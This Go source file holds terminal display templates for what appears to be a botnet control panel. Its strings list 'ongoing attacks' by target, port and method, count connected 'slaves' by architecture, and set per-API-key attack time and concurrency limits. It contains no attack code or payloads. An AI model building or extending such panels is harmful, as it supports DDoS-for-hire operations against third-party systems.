package branding 

var ( //commands/...

	//commands/before-command.itl
	CommandsBeforeCommand string = ""
)

var ( //apis

	//apis\concurrents\fault.itl
	APIS_concurrents_fault string = " Failed to properly edit the maxtime for \"\\x1b[38;5;9m<<key()>>\\x1b[0m\"\r\n"+
		"\r\n"


	//apis\concurrents\success.itl
	APIS_concurrents_success string = " correctly updated the maxtime for \"\\x1b[38;5;2m<<key()>>\\x1b[0m\", changed to <<concurrents()>>\r\n"+
		"\r\n"


	//apis\concurrents\syntax.itl
	APIS_concurrents_syntax string = " Syntax: apis maxtime=<int> <apiKey>\r\n"+
		"\r\n"


	//apis\concurrents\unknown-api.itl
	APIS_concurrents_unknown_api string = " the APIKey \"<<key()>>\" is unclassified\r\n"+
		"\r\n"


	//apis\cooldown\fault.itl
	APIS_cooldown_fault string = " Failed to properly edit the cooldown for \"\\x1b[38;5;9m<<key()>>\\x1b[0m\"\r\n"+
		"\r\n"


	//apis\cooldown\success.itl
	APIS_cooldown_success string = " correctly updated the cooldown for \"\\x1b[38;5;2m<<key()>>\\x1b[0m\", changed to <<cooldown()>>\r\n"+
		"\r\n"


	//apis\cooldown\syntax.itl
	APIS_cooldown_syntax string = " Syntax: apis cooldown=<int> <apiKey>\r\n"+
		"\r\n"


	//apis\cooldown\unknown-api.itl
	APIS_cooldown_unknown_api string = " the APIKey \"<<key()>>\" is unclassified\r\n"+
		"\r\n"


	//apis\create\concurrent-atoi.itl
	APIS_create_concurrent_atoi string = " the concurrents option (aka <<concurrents()>>) must be type int without issues\r\n"+
		"\r\n"


	//apis\create\concurrents.itl
	APIS_create_concurrents string = 		"\\x1b[38;5;15mconcurrents :: \r\n"


	//apis\create\cooldown-atoi.itl
	APIS_create_cooldown_atoi string = " the cooldown option (aka <<cooldown()>>) must be type int without issues\r\n"+
		"\r\n"


	//apis\create\cooldown.itl
	APIS_create_cooldown string = 		"\\x1b[38;5;15mcooldown :: \r\n"


	//apis\create\failed.itl
	APIS_create_failed string = " Failed to insert the apiUser properly without issues\r\n"+
		"\r\n"


	//apis\create\maxtime-atoi.itl
	APIS_create_maxtime_atoi string = " the maxtime option (aka <<maxtime()>>) must be type int without issues\r\n"+
		"\r\n"


	//apis\create\maxtime.itl
	APIS_create_maxtime string = 		"\\x1b[38;5;15mmaxtime :: \r\n"


	//apis\create\success.itl
	APIS_create_success string = "Correctly inserted the user into the apiUsers safely\r\n"+
		"APIKey: <<key()>>\r\n"+
		"\r\n"


	//apis\databaseErr.itl
	APIS_databaseErr string = " Hmmm, sorry <<user.username()>> we were unable to get any api users...\r\n"+
		"\r\n"


	//apis\headers\concurrents.txt
	APIS_headers_concurrents string = 		"*\\x1b[38;5;15mConns*\r\n"


	//apis\headers\cooldown.txt
	APIS_headers_cooldown string = 		"*\\x1b[38;5;15mCooldown*\r\n"


	//apis\headers\id.txt
	APIS_headers_id string = 		"*\\x1b[38;5;15m#*\r\n"


	//apis\headers\maxtime.txt
	APIS_headers_maxtime string = 		"*\\x1b[38;5;15mMaxtime*\r\n"


	//apis\headers\passphase.txt
	APIS_headers_passphase string = 		"*\\x1b[38;5;15mPassphase*\r\n"


	//apis\headers\username.txt
	APIS_headers_username string = 		"*\\x1b[38;5;15mUser*\r\n"


	//apis\link\NotExisting.itl
	APIS_link_NotExisting string = " The api you have provided doesnt exist properly!\r\n"+
		"\r\n"


	//apis\link\apikey.itl
	APIS_link_apikey string = 		"\\x1b[38;5;15m ApiKey ::\\x1b[0m \r\n"


	//apis\link\failed.itl
	APIS_link_failed string = " Hmmm, sorry <<user.username()>> we have failed to link the api with your account\r\n"+
		"\r\n"


	//apis\link\invalidPassword.itl
	APIS_link_invalidPassword string = " The password you provided is classed as invalid!\r\n"+
		"\r\n"


	//apis\link\linkedAlreadyAccount.itl
	APIS_link_linkedAlreadyAccount string = " The ApiKey you have provided is already linked to <<origin()>>\r\n"+
		"\r\n"


	//apis\link\password.itl
	APIS_link_password string = 		"\\x1b[38;5;15m Your Password ::\\x1b[0m \r\n"


	//apis\link\success.itl
	APIS_link_success string = " Hey, good news <<user.username()>>! we have linked the api to your account \r\n"+
		"\r\n"


	//apis\maxtime\fault.itl
	APIS_maxtime_fault string = " Failed to properly edit the maxtime for \"\\x1b[38;5;9m<<key()>>\\x1b[0m\"\r\n"+
		"\r\n"


	//apis\maxtime\success.itl
	APIS_maxtime_success string = " correctly updated the maxtime for \"\\x1b[38;5;2m<<key()>>\\x1b[0m\", changed to <<maxtime()>>\r\n"+
		"\r\n"


	//apis\maxtime\syntax.itl
	APIS_maxtime_syntax string = " Syntax: apis maxtime=<int> <apiKey>\r\n"+
		"\r\n"


	//apis\maxtime\unknown-api.itl
	APIS_maxtime_unknown_api string = " the APIKey \"<<key()>>\" is unclassified\r\n"+
		"\r\n"


	//apis\remove\error_removing.itl
	APIS_remove_error_removing string = " failed to remove `<<account()>>` api\r\n"+
		"\r\n"


	//apis\remove\invalid_api.itl
	APIS_remove_invalid_api string = " `<<arg()>>` is an unclassified arg\r\n"+
		"\r\n"


	//apis\remove\success.itl
	APIS_remove_success string = " `<<account()>>` has been removed\r\n"+
		"\r\n"


	//apis\remove\syntax.itl
	APIS_remove_syntax string = 		" Syntax: apis remove <username>\r\n"


	//apis\reveal\invalid_api.itl
	APIS_reveal_invalid_api string = " `<<target()>>` is an unclassified api!\r\n"+
		"\r\n"


	//apis\reveal\success.itl
	APIS_reveal_success string = " success: <<passphase()>>\r\n"+
		"\r\n"


	//apis\reveal\syntax.itl
	APIS_reveal_syntax string = " Syntax: apis reveal=<id>\r\n"+
		"\r\n"


	//apis\values\concurrents.txt
	APIS_values_concurrents string = 		"*\\x1b[38;5;15m<<$concurrents>>*\r\n"


	//apis\values\cooldown.txt
	APIS_values_cooldown string = 		"*\\x1b[38;5;15m<<$cooldown>>*\r\n"


	//apis\values\id.txt
	APIS_values_id string = 		"*\\x1b[38;5;15m<<$id>>*\r\n"


	//apis\values\maxtime.txt
	APIS_values_maxtime string = 		"*\\x1b[38;5;15m<<$maxtime>>*\r\n"


	//apis\values\passphase.txt
	APIS_values_passphase string = 		"*\\x1b[38;5;15m<<$passphase>>*\r\n"


	//apis\values\username.txt
	APIS_values_username string = 		"*\\x1b[38;5;15m<<$username>>*\r\n"
)


var ( //broadcast

	//broadcast\success.itl
	BROADCAST_success string = " Successfully broadcasted a message with length of <<len(message())>> charaters to <<sent()>> users\r\n"+
		"\r\n"


	//broadcast\syntax.itl
	BROADCAST_syntax string = " Syntax: broadcast <message...>\r\n"+
		"\r\n"
)

var ( //chat

	//chat\banner.itl
	CHAT_banner string = "\\x1b[38;5;15m<_<<colour.marshal(\"Welcome to the chat room. type [exit] to leave!\", \"255,255,0\", \"255,0,255\", \"0,255,255\")>>\\x1b[38;5;15m_>\r\n"+
		"\r\n"


	//chat\incoming-message.itl
	CHAT_incoming_message string = "<<sender()>>#> <<msg()>>\r\n"+
		"\r\n"


	//chat\prompt.itl
	CHAT_prompt string = 		"\\x1b[38;5;15m<<user.username()>>#>\\x1b[38;5;11m \r\n"
)

var ( //commands

	//commands\describe\syntax.itl
	COMMANDS_describe_syntax string = " commands describe <command_path>>\r\n"+
		"\r\n"


	//commands\describe\unknown_command.itl
	COMMANDS_describe_unknown_command string = " `<<command()>>` is an unknown Command\r\n"+
		"\r\n"


	//commands\describe\unknown_subcommand.itl
	COMMANDS_describe_unknown_subcommand string = 		" `<<subcommand()>>` is an invalid subcommand\r\n"


	//commands\headers\header-description.txt
	COMMANDS_headers_header_description string = 		"*\\x1b[38;5;15mDescription*\r\n"


	//commands\headers\header-id.txt
	COMMANDS_headers_header_id string = 		"*\\x1b[38;5;15m#*\r\n"


	//commands\headers\header-name.txt
	COMMANDS_headers_header_name string = 		"*\\x1b[38;5;15mName*\r\n"


	//commands\headers\header-ranks.txt
	COMMANDS_headers_header_ranks string = 		"*\\x1b[38;5;15mRanks*\r\n"


	//commands\unclassified.itl
	COMMANDS_unclassified string = 		"\"<<command()>>\" is a unclassified command\r\n"


	//commands\values\value-description.txt
	COMMANDS_values_value_description string = 		"*\\x1b[38;5;15m<<$description>>*\r\n"


	//commands\values\value-id.txt
	COMMANDS_values_value_id string = 		"*\\x1b[38;5;15m<<$id>>*\r\n"


	//commands\values\value-name.txt
	COMMANDS_values_value_name string = 		"*\\x1b[38;5;15m<<$name>>*\r\n"


	//commands\values\value-ranks.txt
	COMMANDS_values_value_ranks string = 		"*<<$ranks>>*\r\n"
)

var ( //logins

	//logins\databaseFault.itl
	LOGINS_databaseFault string = " Sorry <<user.username()>>, there was an issue while querying your logins\r\n"+
		"\r\n"


	//logins\headers\banner.txt
	LOGINS_headers_banner string = 		"*\\x1b[38;5;15mBanner*\r\n"


	//logins\headers\date.txt
	LOGINS_headers_date string = 		"*\\x1b[38;5;15mTime*\r\n"


	//logins\headers\ip.txt
	LOGINS_headers_ip string = 		"*\\x1b[38;5;15mIP*\r\n"


	//logins\headers\username.txt
	LOGINS_headers_username string = 		"*\\x1b[38;5;15mUsername*\r\n"


	//logins\values\banner.txt
	LOGINS_values_banner string = 		"<<$banner>>\r\n"


	//logins\values\date.txt
	LOGINS_values_date string = 		"<<$date>>\r\n"


	//logins\values\ip.txt
	LOGINS_values_ip string = 		"<<$ip>>\r\n"


	//logins\values\username.txt
	LOGINS_values_username string = 		"<<$username>>\r\n"
)

var ( //methods

	//methods\headers\description.txt
	METHODS_headers_description string = 		"*\\x1b[38;5;15mDescription*\r\n"


	//methods\headers\name.txt
	METHODS_headers_name string = 		"*\\x1b[38;5;15mName*\r\n"


	//methods\headers\ranks.txt
	METHODS_headers_ranks string = 		"*\\x1b[38;5;15mRanks*\r\n"


	//methods\values\description.txt
	METHODS_values_description string = 		"*\\x1b[38;5;15m<<$description>>*\r\n"


	//methods\values\name.txt
	METHODS_values_name string = 		"*\\x1b[38;5;15m<<$name>>*\r\n"


	//methods\values\ranks.txt
	METHODS_values_ranks string = 		"*\\x1b[38;5;15m<<$ranks>>*\r\n"
)

var ( //myrunning

	//myrunning\headers\finish.txt
	MYRUNNING_headers_finish string = 		"*\\x1b[38;5;15mFinish*\r\n"


	//myrunning\headers\id.txt
	MYRUNNING_headers_id string = 		"*\\x1b[38;5;15m#*\r\n"


	//myrunning\headers\length.txt
	MYRUNNING_headers_length string = 		"*\\x1b[38;5;15mLength*\r\n"


	//myrunning\headers\method.txt
	MYRUNNING_headers_method string = 		"*\\x1b[38;5;15mMethod*\r\n"


	//myrunning\headers\port.txt
	MYRUNNING_headers_port string = 		"*\\x1b[38;5;15mPort*\r\n"


	//myrunning\headers\target.txt
	MYRUNNING_headers_target string = 		"*\\x1b[38;5;15mTarget*\r\n"


	//myrunning\no-running.itl
	MYRUNNING_no_running string = " Hey <<user.username()>>! it seems you have 0 ongoing attacks!\r\n"+
		"\r\n"


	//myrunning\values\finish.txt
	MYRUNNING_values_finish string = 		"*\\x1b[38;5;15m<<$finish>>secs*\r\n"


	//myrunning\values\id.txt
	MYRUNNING_values_id string = 		"*\\x1b[38;5;15m<<$id>>*\r\n"


	//myrunning\values\length.txt
	MYRUNNING_values_length string = 		"*\\x1b[38;5;15m<<$length>>*\r\n"


	//myrunning\values\method.txt
	MYRUNNING_values_method string = 		"*\\x1b[38;5;15m<<$method>>*\r\n"


	//myrunning\values\port.txt
	MYRUNNING_values_port string = 		"*\\x1b[38;5;15m<<$port>>*\r\n"


	//myrunning\values\target.txt
	MYRUNNING_values_target string = 		"*\\x1b[38;5;15m<<$target>>*\r\n"
)

var ( //ongoing

	//ongoing\headers\finish.txt
	ONGOING_headers_finish string = 		"*\\x1b[38;5;15mFinish*\r\n"


	//ongoing\headers\id.txt
	ONGOING_headers_id string = 		"*\\x1b[38;5;15m#*\r\n"


	//ongoing\headers\length.txt
	ONGOING_headers_length string = 		"*\\x1b[38;5;15mLength*\r\n"


	//ongoing\headers\method.txt
	ONGOING_headers_method string = 		"*\\x1b[38;5;15mMethod*\r\n"


	//ongoing\headers\port.txt
	ONGOING_headers_port string = 		"*\\x1b[38;5;15mPort*\r\n"


	//ongoing\headers\target.txt
	ONGOING_headers_target string = 		"*\\x1b[38;5;15mTarget*\r\n"


	//ongoing\headers\username.txt
	ONGOING_headers_username string = 		"*\\x1b[38;5;15mUser*\r\n"


	//ongoing\no-running.itl
	ONGOING_no_running string = " Hey <<user.username()>>! it seems there are 0 ongoing attacks!\r\n"+
		"\r\n"


	//ongoing\values\finish.txt
	ONGOING_values_finish string = 		"*\\x1b[38;5;15m<<$finish>>secs*\r\n"


	//ongoing\values\id.txt
	ONGOING_values_id string = 		"*\\x1b[38;5;15m<<$id>>*\r\n"


	//ongoing\values\length.txt
	ONGOING_values_length string = 		"*\\x1b[38;5;15m<<$length>>*\r\n"


	//ongoing\values\method.txt
	ONGOING_values_method string = 		"*\\x1b[38;5;15m<<$method>>*\r\n"


	//ongoing\values\port.txt
	ONGOING_values_port string = 		"*\\x1b[38;5;15m<<$port>>*\r\n"


	//ongoing\values\target.txt
	ONGOING_values_target string = 		"*\\x1b[38;5;15m<<$target>>*\r\n"


	//ongoing\values\username.txt
	ONGOING_values_username string = 		"*\\x1b[38;5;15m<<$username>>*\r\n"
)

var ( //password

	//password\banner.itl
	PASSWORD_banner string = 		"\r\n"


	//password\confirm-password.itl
	PASSWORD_confirm_password string = 		" \\x1b[38;5;15m Confirm password :: \\x1b[0m\r\n"


	//password\error.itl
	PASSWORD_error string = " \\x1b[38;5;1m failed to update <<user.username()>>'s password\r\n"+
		"\r\n"


	//password\not-matching.itl
	PASSWORD_not_matching string = " The passwords provided do not match each other!\r\n"+
		"\r\n"


	//password\password.itl
	PASSWORD_password string = 		" \\x1b[38;5;15m Password :: \\x1b[0m\r\n"


	//password\success.itl
	PASSWORD_update_success string = " \\x1b[38;5;2m Correctly updated <<user.username()>>'s password\r\n"+
		"\r\n"
)

var ( //slaves

	//slaves\headers\amount.txt
	SLAVES_headers_amount string = 		"*\\x1b[38;5;15mConnected*\r\n"


	//slaves\headers\arch.txt
	SLAVES_headers_arch string = 		"*\\x1b[38;5;15mArchitecture*\r\n"


	//slaves\text\architecture.tfx
	SLAVES_text_architecture string = 		"<<$arch>>: \r\n"


	//slaves\text\counted.tfx
	SLAVES_text_counted string = "<<$counted>>\r\n"+
		"\r\n"


	//slaves\values\amount.txt
	SLAVES_values_amount string = 		"*\\x1b[38;5;15m<<$amount>>*\r\n"


	//slaves\values\arch.txt
	SLAVES_values_arch string = 		"*\\x1b[38;5;15m<<$arch>>*\r\n"
)

var ( //themes

	//themes\change\fault-theme.itl
	THEMES_change_fault_theme string = " Failed to update your main theme to <<theme()>>\r\n"+
		"\r\n"


	//themes\change\invalidtheme.itl
	THEMES_change_invalidtheme string = " The theme `<<theme()>>` is unclassified\r\n"+
		"\r\n"


	//themes\change\permissionsFault.itl
	THEMES_change_permissionsFault string = " Hey <<user.username()>>, your missing the permissions to change theme to <<theme()>>\r\n"+
		"\r\n"


	//themes\change\success.itl
	THEMES_change_success string = "<<clear()>>Correctly updated your theme to: `<<theme()>>`\r\n"+
		"\r\n"+
		"\r\n"+
		"<?\r\n"+
		"	if user.theme() != \"default\" {\r\n"+
		"		//basic include system for different branding peices\r\n"+
		"		include(user.theme() + \"/\" + \"welcome.itl\")\r\n"+
		"	} else {\r\n"+
		"		//default home screen\r\n"+
		"		include(\"welcome.itl\")\r\n"+
		"	}\r\n"+
		"?>\r\n"


	//themes\change\syntax.itl
	THEMES_change_syntax string = " Syntax: themes change <newTheme>\r\n"+
		"\r\n"


	//themes\headers\description.txt
	THEMES_headers_description string = 		"*\\x1b[38;5;15mDescription*\r\n"


	//themes\headers\name.txt
	THEMES_headers_name string = 		"*\\x1b[38;5;15mName*\r\n"


	//themes\headers\ranks.txt
	THEMES_headers_ranks string = 		"*\\x1b[38;5;15mRanks*\r\n"


	//themes\values\description.txt
	THEMES_values_description string = 		"*\\x1b[38;5;15m<<$description>>*\r\n"


	//themes\values\name.txt
	THEMES_values_name string = 		"*\\x1b[38;5;15m<<$name>>*\r\n"


	//themes\values\ranks.txt
	THEMES_values_ranks string = 		"*\\x1b[38;5;15m<<$ranks>>*\r\n"
)

var ( //tokens

	//tokens\branding-eof.itl
	TOKENS_branding_eof string = " the Branding object \"<<object()>>\" is an unclassified object \r\n"+
		"\r\n"


	//tokens\syntax.itl
	TOKENS_syntax string = " Syntax: tokens <target>\r\n"+
		"\r\n"
)

var ( //who

	//who\headers\client.txt
	WHO_headers_client string = 		"*\\x1b[38;5;15mClient\\x1b[0m*\r\n"


	//who\headers\connected.txt
	WHO_headers_connected string = 		"*\\x1b[38;5;15mConnected*\r\n"


	//who\headers\ip.txt
	WHO_headers_ip string = 		"*\\x1b[38;5;15mIP*\r\n"


	//who\headers\timestamp.txt
	WHO_headers_timestamp string = 		"*\\x1b[38;5;15munix\\x1b[0m*\r\n"


	//who\headers\username.txt
	WHO_headers_username string = 		"*\\x1b[38;5;15mUsername*\r\n"


	//who\values\client.txt
	WHO_values_client string = 		"*\\x1b[38;5;15m<<$client>>\\x1b[0m*\r\n"


	//who\values\connected.txt
	WHO_values_connected string = 		"*\\x1b[38;5;15m<<$connected>>*\r\n"


	//who\values\ip.txt
	WHO_values_ip string = 		"*\\x1b[38;5;15m<<$ip>>*\r\n"


	//who\values\timestamp.txt
	WHO_values_timestamp string = 		"*\\x1b[38;5;15m<<$timestamp>>*\r\n"


	//who\values\username.txt
	WHO_values_username string = 		"*\\x1b[38;5;15m<<$username>>*\r\n"
)
